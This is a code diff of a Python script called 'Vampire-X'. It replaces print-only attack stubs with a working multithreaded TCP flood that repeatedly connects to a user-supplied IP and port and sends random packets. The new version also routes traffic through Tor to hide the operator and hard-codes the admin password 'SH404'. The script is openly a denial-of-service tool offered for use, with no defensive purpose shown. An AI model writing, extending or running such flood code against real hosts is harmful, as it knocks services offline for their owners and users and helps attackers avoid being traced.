@@ -1,190 +1,102 @@
-#!/usr/bin/env python3
 import os
 import sys
+import socket
+import threading
 import time
-import hashlib
-import traceback
+import random
+import socks  # PySocks for TOR proxy
+import subprocess
 
-# === Dynamic Import Fix and Proxy Handling ===
-
-def fix_imports():
+# Ensure required modules
+required_modules = ["socks", "requests"]
+for module in required_modules:
     try:
-        import colorama
-        from colorama import Fore, Style
+        __import__(module)
     except ImportError:
-        os.system("pip install colorama")
-        import colorama
-        from colorama import Fore, Style
-    colorama.init()
-    return Fore, Style
+        os.system(f"pip install {module}")
 
-Fore, Style = fix_imports()
+# ========== Advanced Banner System ==========
+def show_banner(mode):
+    banner = f"""
+{'='*50}
+   Vampire-X {'Admin Panel' if mode == 'admin' else 'User Panel'}
+   Mode: {'Administrator Access' if mode == 'admin' else 'User Access'}
+   Status: ACTIVE | Anonymous Mode: ENABLED
+   Coded by: JANU (aka Sourav)
+{'='*50}
+"""
+    print(banner)
 
-# === Directories Setup ===
-
-def auto_create_dirs():
-    os.makedirs("logs", exist_ok=True)
-    os.makedirs("proxies", exist_ok=True)
-    for f in ["logs/.keep", "proxies/proxy.txt", "proxies/working_proxies.txt"]:
-        open(f, 'a').close()
-
-# === Password Verification ===
-
-def verify_password(input_password):
-    return hashlib.sha256(input_password.encode()).hexdigest() == PASSWORD_HASH
-
-# === Auto Fix Missing Modules ===
-
-def try_import(module, pip_name=None):
+# ========== TOR Integration ==========
+def start_tor():
+    print("[+] Initializing TOR for anonymous routing...")
     try:
-        return __import__(module)
-    except ImportError:
-        os.system(f"pip install {pip_name or module}")
-        return __import__(module)
-
-# === Load Attack Modules (Auto Recovery) ===
-
-def try_load_attacks():
-    try:
-        global tcp, udp, slowloris
-        import attacks.tcp as tcp
-        import attacks.udp as udp
-        import attacks.slowloris as slowloris
-    except Exception:
-        os.makedirs("attacks", exist_ok=True)
-        with open("attacks/tcp.py", "w") as f:
-            f.write("""def attack(ip, port, threads):\n    print(f'TCP Flood to {ip}:{port} with {threads} threads')\n""")
-        with open("attacks/udp.py", "w") as f:
-            f.write("""def attack(ip, port, threads):\n    print(f'UDP Flood to {ip}:{port} with {threads} threads')\n""")
-        with open("attacks/slowloris.py", "w") as f:
-            f.write("""def attack(domain, threads):\n    print(f'Slowloris Attack to {domain} with {threads} threads')\n""")
-        try_load_attacks()
-
-# === Load Proxy Checker ===
-
-def try_load_proxy_checker():
-    try:
-        global load_proxies
-        from proxy_checker import load_proxies
-    except Exception:
-        with open("proxy_checker.py", "w") as f:
-            f.write("""def load_proxies():\n    print('Loading proxies... [Dummy Function]')\n""")
-        try_load_proxy_checker()
-
-# === Banners ===
-
-def banner_admin():
-    print(Fore.RED + Style.BRIGHT + """
- ██╗░░░██╗░█████╗░███╗░░░███╗██████╗░███████╗██╗███╗░░██╗
- ██║░░░██║██╔══██╗████╗░████║██╔══██╗██╔════╝██║████╗░██║
- ╚██╗░██╔╝███████║██╔████╔██║██║░░██║█████╗░░██║██╔██╗██║
- ░╚████╔╝░██╔══██║██║╚██╔╝██║██║░░██║██╔══╝░░██║██║╚████║
- ░░╚██╔╝░░██║░░██║██║░╚═╝░██║██████╔╝███████╗██║██║░╚███║
- ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝╚═╝░░╚══╝
- [ Vampire-X Admin Panel ]
- """ + Style.RESET_ALL)
-
-def banner_user():
-    print(Fore.CYAN + Style.BRIGHT + """
-╔═════════════════════════════════════╗
-║         Vampire-X User Panel       ║
-╚═════════════════════════════════════╝
-""" + Style.RESET_ALL)
-
-# === Menus ===
-
-def admin_menu():
-    print("[1] TCP Flood")
-    print("[2] UDP Flood")
-    print("[3] Slowloris")
-    print("[4] Check Proxies")
-    print("[0] Exit")
-
-def user_menu():
-    print("[1] TCP Flood")
-    print("[2] UDP Flood")
-    print("[0] Exit")
-
-# === Live Attack Logging ===
-
-def log_attack(atype, target, port, threads):
-    with open("logs/attack.log", "a") as f:
-        f.write(f"{time.ctime()} | {atype} | {target}:{port} | Threads: {threads}\n")
-
-# === Handle Choices ===
-
-def handle_choice(choice, mode="user"):
-    try:
-        if choice == "1":
-            target = input("Target IP/Domain: ")
-            port = int(input("Port: "))
-            threads = int(input("Threads: "))
-            log_attack("TCP", target, port, threads)
-            tcp.attack(target, port, threads)
-
-        elif choice == "2":
-            target = input("Target IP/Domain: ")
-            port = int(input("Port: "))
-            threads = int(input("Threads: "))
-            log_attack("UDP", target, port, threads)
-            udp.attack(target, port, threads)
-
-        elif choice == "3" and mode == "admin":
-            target = input("Target Domain: ")
-            threads = int(input("Threads: "))
-            log_attack("Slowloris", target, 80, threads)
-            slowloris.attack(target, threads)
-
-        elif choice == "4" and mode == "admin":
-            load_proxies()
-
-        elif choice == "0":
-            print("Exiting...")
-            sys.exit()
-
-        else:
-            print(Fore.YELLOW + "Invalid Option!" + Style.RESET_ALL)
-
+        # Start TOR service (Linux only)
+        subprocess.call("service tor start", shell=True)
+        time.sleep(3)
+        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+        socket.socket = socks.socksocket
+        print("[+] TOR routing active.")
     except Exception as e:
-        with open("logs/errors.log", "a") as f:
-            f.write(f"{time.ctime()} | Error: {str(e)}\n{traceback.format_exc()}\n")
-        print(Fore.RED + f"An error occurred: {e}" + Style.RESET_ALL)
+        print(f"[!] TOR error: {e}. Trying without TOR...")
 
-# === Main Execution ===
+# ========== DDoS Attack Function ==========
+def tcp_flood(target, port, threads):
+    packet = random._urandom(1024)
+    print(f"[TCP] Attack started on {target}:{port} with {threads} threads")
+    
+    def attack():
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect((target, port))
+                for _ in range(100):
+                    s.send(packet)
+                s.close()
+                print(f"[TCP] Packet sent to {target}:{port}")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                pass
 
-PASSWORD_HASH = hashlib.sha256("SH404".encode()).hexdigest()
+    for _ in range(threads):
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
 
+# ========== Main Function ==========
 def main():
     try:
-        auto_create_dirs()
-        try_load_attacks()
-        try_load_proxy_checker()
-
-        print("[1] Admin Access")
-        print("[2] User Access")
-        level = input("Select Mode: ")
-        mode = "user"
-
-        if level == "1":
-            pwd = input("Enter Admin Password: ")
-            if verify_password(pwd):
-                mode = "admin"
+        mode = input("Enter mode (admin/user): ").strip().lower()
+        if mode == 'admin':
+            password = input("Enter admin password: ")
+            if password != "SH404":
+                print("Incorrect password. Exiting.")
+                return
+            show_banner("admin")
+            tor_pass = input("Enter TOR password to enable anonymity: ")
+            if tor_pass == "SH404":
+                start_tor()
             else:
-                print(Fore.RED + "Wrong Password! Switching to User Mode..." + Style.RESET_ALL)
+                print("Invalid TOR password. Proceeding without TOR.")
+        else:
+            show_banner("user")
+            start_tor()
 
-        os.system('cls' if os.name == 'nt' else 'clear')
-        banner_admin() if mode == "admin" else banner_user()
+        target = input("Enter Target IP: ")
+        port = int(input("Enter Target Port: "))
+        threads = int(input("Enter Threads: "))
 
+        tcp_flood(target, port, threads)
         while True:
-            admin_menu() if mode == "admin" else user_menu()
-            choice = input("Select Option: ")
-            handle_choice(choice, mode)
-            input("\nPress Enter to continue...")
-            os.system('cls' if os.name == 'nt' else 'clear')
-            banner_admin() if mode == "admin" else banner_user()
+            time.sleep(1)
 
     except KeyboardInterrupt:
-        print(Fore.RED + "\nInterrupted. Exiting..." + Style.RESET_ALL)
+        print("\n[!] Attack stopped by user.")
+    except Exception as e:
+        print(f"[!] Fatal Error: {str(e)} — Retrying in safe mode...")
+        time.sleep(2)
+        main()  # Restart
 
 if __name__ == "__main__":
     main()
